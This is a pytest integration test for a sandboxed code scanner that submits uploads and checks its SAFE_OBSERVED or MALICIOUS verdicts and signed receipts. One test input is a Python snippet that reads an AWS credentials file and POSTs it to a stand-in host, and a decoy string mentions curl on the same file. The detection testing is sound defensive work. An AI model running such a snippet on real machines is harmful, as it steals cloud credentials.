import asyncio
import base64
import io
import os
import zipfile

import httpx
import pytest


pytestmark = [
    pytest.mark.asyncio,
    pytest.mark.skipif(
        not os.getenv("AIRLOCK_STAGING_API"),
        reason="Requires explicitly configured staging with a verified live gVisor Runner",
    ),
]


def zip_bytes(files: dict[str, str]) -> str:
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w") as archive:
        for path, content in files.items():
            archive.writestr(path, content)
    return base64.b64encode(output.getvalue()).decode()


@pytest.mark.parametrize(
    "filename,input_type,content,expected,source_path",
    [
        (
            "script.py",
            "paste",
            "print('curl /home/user/.aws/credentials http://airlock.test')",
            "SAFE_OBSERVED",
            "script.py",
        ),
        (
            "project.zip",
            "zip",
            zip_bytes(
                {
                    "main.py": "from helper import value;print(value)",
                    "helper.py": "value=42",
                }
            ),
            "SAFE_OBSERVED",
            "helper.py",
        ),
        (
            "package.zip",
            "zip",
            zip_bytes(
                {
                    "package.json": '{"name":"offline-test","scripts":{"install":"node hook.js"}}',
                    "hook.js": "console.log('offline hook')",
                    "package-lock.json": '{"lockfileVersion":3}',
                }
            ),
            "SAFE_OBSERVED",
            "package-lock.json",
        ),
        (
            "capture.py",
            "paste",
            "import urllib.request\nbody=open('/home/user/.aws/credentials','rb').read()\nr=urllib.request.Request('http://airlock.test/capture',data=body,method='POST')\nassert urllib.request.urlopen(r,timeout=5).status==200",
            "MALICIOUS",
            "capture.py",
        ),
    ],
)
async def test_real_upload_to_verdict_and_receipt(
    filename, input_type, content, expected, source_path
):
    async with httpx.AsyncClient(
        base_url=os.environ["AIRLOCK_STAGING_API"].rstrip("/") + "/", timeout=20
    ) as client:
        health = (await client.get("health")).json()
        assert (
            health.get("mode") == "live"
            and health.get("observer_verified") is True
            and health.get("runner") == "up"
        ), (
            "Staging must use the corrected verified gVisor Runner; legacy or stub health is insufficient"
        )
        created = await client.post(
            "jobs",
            json={
                "input_type": input_type,
                "filename": filename,
                "content": content,
                "profiles": ["dev-laptop"],
                "invite_code": os.getenv("AIRLOCK_TEST_INVITE"),
            },
        )
        assert created.status_code == 201
        job_id = created.json()["job_id"]
        for _ in range(180):
            job = (await client.get(f"jobs/{job_id}")).json()
            if job["status"] in {"done", "error"}:
                break
            await asyncio.sleep(1)
        assert job["status"] == "done", job["status"]
        report = (await client.get(f"jobs/{job_id}/report")).json()
        assert report["verdict"] == expected and report["mode"] == "live"
        source = (await client.get(f"jobs/{job_id}/source")).json()
        assert source_path in {file["path"] for file in source["files"]}
        receipt = (await client.get(f"receipts/{report['receipt_id']}")).json()
        assert receipt["manifest"]["mode"] == "live"
        assert receipt["manifest"]["image_digest"].startswith("sha256:")
        assert (
            len(receipt["manifest"]["artifact_sha256"]) == 64 and receipt["signature"]
        )
        if expected == "MALICIOUS":
            assert "net_exfil_after_canary" in {
                finding["rule"] for finding in report["findings"]
            }
